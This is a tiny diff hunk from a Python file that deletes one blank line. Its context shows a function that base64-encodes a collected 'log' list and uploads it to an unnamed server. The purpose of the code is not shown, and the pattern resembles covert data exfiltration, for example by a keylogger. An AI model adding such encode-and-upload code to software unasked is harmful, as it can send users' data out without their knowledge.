@@ -47,7 +47,6 @@ def b64encode(s):
 # This function uses the list "log", encodes it to base64 and
 # uploads it to the server for safekeeping
 
-
 def uploadLog():
     log_txt = "".join(log)
     b64log = b64encode(log_txt)
